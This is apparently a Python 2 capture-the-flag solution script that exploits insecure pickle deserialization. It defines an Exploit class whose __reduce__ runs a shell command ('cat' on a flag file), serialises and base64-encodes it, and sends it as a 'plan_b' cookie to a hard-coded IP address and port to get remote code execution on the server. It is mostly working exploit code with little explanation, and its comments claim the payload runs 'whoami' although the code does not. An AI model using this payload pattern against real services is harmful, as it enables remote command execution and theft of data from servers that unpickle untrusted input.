import cPickle
from base64 import *
import subprocess

# Attacker prepares exploit that application will insecurely deserialize
class Exploit(object):
    def __reduce__(self):
        #return "hello"
        return (subprocess.check_output, (['cat','flag_wIp1b'],))

# Attacker serializes the exploit
def serialize_exploit():
    shellcode = cPickle.dumps({"serum" : Exploit()},protocol=0)
    return shellcode

plan_b = "KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu"
clear_plan_b = b64decode(plan_b)

# Application insecurely deserializes the attacker's serialized data
def insecure_deserialization(exploit_code):
    d = cPickle.loads(exploit_code)
    return d


def send():
    import requests
    from bs4 import BeautifulSoup
    burp0_url = "http://64.227.47.172:31498/"

    payload = serialize_exploit()
    payload = b64encode(payload)

    burp0_cookies = {
            "plan_b": "%s" % payload
            }
    r = requests.get(burp0_url, cookies=burp0_cookies)
    #print (r.text)
    soup = BeautifulSoup(r.text,features="html.parser")
    print (soup.span)
    pass

if __name__ == '__main__':
    # Attacker's payload runs a `whoami` command
    #anti_pickle_serum = Exploit 
    
    #d = insecure_deserialization(clear_plan_b)
    #print ("# d1: " + str(d))

    #print (serialize_exploit())
    #d = insecure_deserialization(serialize_exploit()) 
    #print ("# d2: " + str(d))
    
    send()
